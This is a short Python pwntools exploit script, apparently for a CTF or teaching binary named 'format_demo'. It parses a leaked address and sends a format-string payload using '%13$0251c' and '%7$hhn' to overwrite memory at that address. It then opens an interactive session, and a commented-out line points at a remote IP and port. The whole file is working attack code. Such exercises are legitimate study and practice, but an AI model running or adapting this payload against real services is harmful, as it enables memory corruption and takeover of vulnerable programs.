#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack


# count = 0
# conn = remote("4.31.182.242", 9002) 
conn = process('./format_demo')


# Welcome message
# front_line = conn.recvuntil("\n")

welcome = conn.recvuntil('>')
print welcome

index = welcome.index("0x")
addr = int(welcome[index: index + 10], 16)

log.info('Variable is at:' + str(hex(addr)))

payload = "A"+ p32(addr) + "%13$0251c" + "%7$hhn"


log.info('Sending payload:' + payload)
conn.sendline(payload)
# print conn.recvuntil("\n")
conn.interactive()
conn.recv()
print conn.recv()
conn.close()


